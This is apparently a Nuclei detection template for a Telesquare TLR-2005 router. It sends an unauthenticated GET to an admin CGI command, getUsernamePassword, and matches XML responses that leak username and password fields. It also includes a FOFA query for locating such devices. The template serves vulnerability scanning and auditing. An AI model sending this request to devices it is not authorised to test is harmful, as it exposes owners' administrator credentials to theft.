id: telesquare-tlr2005-getusernamepassword-info-leak
info:
  name: Telesquare TLR2005 Username and Password Information Disclosure
  author: ProjectDiscoveryAI
  severity: high
  tags: info-leak
  metadata:
    finger: telesquare
    fofa: app="TELESQUARE-TLR-2005KSH"
http:
  - method: GET
    path:
      - "/cgi-bin/admin.cgi?Command=getUsernamePassword"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "<username>.*?</username>"
      - type: word
        words:
          - "<password>"
      - type: word
        part: header
        words:
          - "text/xml"
